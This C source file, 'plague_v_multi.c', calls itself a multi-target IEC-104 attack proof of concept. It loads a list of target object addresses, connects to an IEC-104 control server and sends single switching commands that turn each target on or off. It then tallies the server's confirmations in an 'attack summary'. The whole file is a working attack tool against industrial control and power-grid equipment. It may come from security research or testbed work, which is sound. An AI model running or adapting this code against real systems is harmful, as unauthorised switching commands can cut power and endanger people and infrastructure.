/*
 * plague_v_multi.c — Multi-IOA IEC-104 Attack PoC (Milestone 2)
 *
 * Loads IOA targets from a config file, connects to an IEC-104 server,
 * and sends C_SC_NA_1 commands to each target IOA in sequence.
 *
 * Build: make plague_v_multi
 * Usage: ./plague_v_multi [target_ip] [port] [config_path]
 *   Defaults: 10.10.10.10  2404  config/target_ioa_map.txt
 */

#include "cs104_connection.h"
#include "hal_thread.h"
#include "hal_time.h"
#include "ioa_parser.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Config defaults */
#define DEFAULT_IP          "10.10.10.10"
#define DEFAULT_PORT        2404
#define DEFAULT_CONFIG      "config/target_ioa_map.txt"
#define DEFAULT_CA          1
#define DEFAULT_OA          3
#define INTER_CMD_DELAY_MS  50      /* Delay between commands (ms) */
#define RESPONSE_WAIT_MS    3000    /* Wait time for ACT_CON responses */

/* Global counters for response tracking */
static volatile int g_confirm_count  = 0;   /* Positive ACT_CON received */
static volatile int g_reject_count   = 0;   /* Negative ACT_CON or error */

/* Raw message handler: hex-dump every frame */
static void
rawMessageHandler(void* parameter, uint8_t* msg, int msgSize, bool sent)
{
    (void)parameter;
    printf("  %s ", sent ? ">>>" : "<<<");
    for (int i = 0; i < msgSize; i++)
        printf("%02x ", msg[i]);
    printf("\n");
}

/* Connection event handler */
static void
connectionHandler(void* parameter, CS104_Connection connection,
                  CS104_ConnectionEvent event)
{
    (void)parameter;
    (void)connection;
    switch (event) {
    case CS104_CONNECTION_OPENED:
        printf("[+] TCP connected\n");
        break;
    case CS104_CONNECTION_CLOSED:
        printf("[*] Connection closed\n");
        break;
    case CS104_CONNECTION_FAILED:
        printf("[!] Connection FAILED\n");
        break;
    case CS104_CONNECTION_STARTDT_CON_RECEIVED:
        printf("[+] STARTDT_CON received — data transfer ACTIVE\n");
        break;
    case CS104_CONNECTION_STOPDT_CON_RECEIVED:
        printf("[+] STOPDT_CON received\n");
        break;
    }
}

/* ASDU received handler: track confirmations */
static bool
asduReceivedHandler(void* parameter, int address, CS101_ASDU asdu)
{
    (void)parameter;
    (void)address;
    TypeID tid = CS101_ASDU_getTypeID(asdu);
    CS101_CauseOfTransmission cot = CS101_ASDU_getCOT(asdu);
    bool negative = CS101_ASDU_isNegative(asdu);

    if (tid == C_SC_NA_1) {
        InformationObject io = CS101_ASDU_getElement(asdu, 0);
        int ioa = io ? InformationObject_getObjectAddress(io) : -1;

        if (cot == CS101_COT_ACTIVATION_CON) {
            if (negative) {
                printf("[!] ACT_CON NEGATIVE for IOA %d\n", ioa);
                g_reject_count++;
            }
            else {
                printf("[+] ACT_CON OK for IOA %d\n", ioa);
                g_confirm_count++;
            }
        }
        else if (cot == CS101_COT_ACTIVATION_TERMINATION) {
            printf("[+] ACT_TERM for IOA %d\n", ioa);
        }
        else if (cot == CS101_COT_UNKNOWN_IOA) {
            printf("[!] UNKNOWN_IOA for IOA %d\n", ioa);
            g_reject_count++;
        }
        else if (cot == CS101_COT_UNKNOWN_COT) {
            printf("[!] UNKNOWN_COT for IOA %d\n", ioa);
            g_reject_count++;
        }
        else {
            printf("[<] C_SC_NA_1 response: COT=%d IOA=%d negative=%d\n",
                   cot, ioa, negative);
        }

        if (io)
            InformationObject_destroy(io);
    }
    else {
        /* Log non-command ASDUs (periodic data, etc.) */
        printf("[<] ASDU type=%s(%d) cot=%d\n",
               TypeID_toString(tid), tid, cot);
    }

    return true;
}

/* Main */
int
main(int argc, char** argv)
{
    const char* ip          = DEFAULT_IP;
    int         port        = DEFAULT_PORT;
    const char* config_path = DEFAULT_CONFIG;

    if (argc > 1) ip          = argv[1];
    if (argc > 2) port        = atoi(argv[2]);
    if (argc > 3) config_path = argv[3];

    printf("╔══════════════════════════════════════════╗\n");
    printf("║   PLAGUE-V  —  Multi-IOA Attack (M2)    ║\n");
    printf("╚══════════════════════════════════════════╝\n");
    printf("[*] Target : %s:%d\n", ip, port);
    printf("[*] Config : %s\n", config_path);
    printf("[*] CA=%d  OA=%d\n\n", DEFAULT_CA, DEFAULT_OA);

    /* Step 1: Load IOA map */
    IOATarget *targets = load_ioa_map(config_path);
    if (targets == NULL) {
        fprintf(stderr, "[!] Failed to load IOA map from %s\n", config_path);
        return 1;
    }

    int total_targets = get_ioa_count(targets);
    printf("[*] Loaded %d target IOAs:\n", total_targets);
    print_ioa_map(targets);
    printf("\n");

    /* Step 2: Create connection */
    CS104_Connection con = CS104_Connection_create(ip, port);
    if (con == NULL) {
        fprintf(stderr, "[!] Failed to create connection object\n");
        free_ioa_map(targets);
        return 1;
    }

    /* Step 3: Configure parameters */
    CS101_AppLayerParameters alParams = CS104_Connection_getAppLayerParameters(con);
    alParams->originatorAddress = DEFAULT_OA;

    CS104_APCIParameters apciParams = CS104_Connection_getAPCIParameters(con);
    apciParams->t0 = 5;

    /* Step 4: Register callbacks */
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);
    CS104_Connection_setASDUReceivedHandler(con, asduReceivedHandler, NULL);
    CS104_Connection_setRawMessageHandler(con, rawMessageHandler, NULL);

    /* Step 5: TCP connect */
    printf("[*] Connecting to %s:%d ...\n", ip, port);
    if (!CS104_Connection_connect(con)) {
        fprintf(stderr, "[!] TCP connection failed (timeout after %ds)\n",
                apciParams->t0);
        CS104_Connection_destroy(con);
        free_ioa_map(targets);
        return 1;
    }

    /* Step 6: Activate data transfer */
    printf("[>] Sending STARTDT_ACT ...\n");
    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    /* Step 7: Attack sequence */
    printf("\n[*] Beginning attack sequence ...\n");

    IOATarget *current = targets;
    int send_count = 0;
    int send_fail  = 0;

    while (current != NULL) {
        printf("[>] Attacking IOA %u (%s) → %s\n",
               current->ioa, current->name,
               current->target_state ? "ON" : "OFF");

        InformationObject sc = (InformationObject)
            SingleCommand_create(NULL, (int)current->ioa,
                                 (bool)current->target_state, false, 0);

        if (sc == NULL) {
            fprintf(stderr, "    [!] Failed to create command for IOA %u\n",
                    current->ioa);
            send_fail++;
            current = current->next;
            continue;
        }

        bool sent = CS104_Connection_sendProcessCommandEx(
            con, CS101_COT_ACTIVATION, DEFAULT_CA, sc);

        InformationObject_destroy(sc);

        if (sent) {
            printf("    [+] Command sent\n");
            send_count++;
        }
        else {
            printf("    [!] Send failed (buffer full?)\n");
            send_fail++;
        }

        Thread_sleep(INTER_CMD_DELAY_MS);
        current = current->next;
    }

    printf("\n[*] Attack sequence complete: %d sent, %d failed\n",
           send_count, send_fail);

    /* Step 8: Wait for responses */
    printf("[*] Waiting %dms for ACT_CON responses ...\n", RESPONSE_WAIT_MS);
    Thread_sleep(RESPONSE_WAIT_MS);

    /* Step 9: Summary */
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║             ATTACK SUMMARY               ║\n");
    printf("╠══════════════════════════════════════════╣\n");
    printf("║  Targets loaded   : %-20d ║\n", total_targets);
    printf("║  Commands sent    : %-20d ║\n", send_count);
    printf("║  Send failures    : %-20d ║\n", send_fail);
    printf("║  ACT_CON received : %-20d ║\n", g_confirm_count);
    printf("║  Rejected/errors  : %-20d ║\n", g_reject_count);
    printf("╚══════════════════════════════════════════╝\n");

    int exit_code;
    if (send_count > 0 && send_fail == 0 && g_reject_count == 0) {
        printf("\n[✓] SUCCESS — all commands accepted\n");
        exit_code = 0;
    }
    else if (send_count > 0) {
        printf("\n[~] PARTIAL — some commands failed or rejected\n");
        exit_code = 2;
    }
    else {
        printf("\n[✗] FAILURE — no commands sent\n");
        exit_code = 1;
    }

    /* Step 10: Cleanup */
    printf("[*] Disconnecting ...\n");
    CS104_Connection_destroy(con);
    free_ioa_map(targets);
    printf("[*] Done (exit code %d)\n", exit_code);

    return exit_code;
}
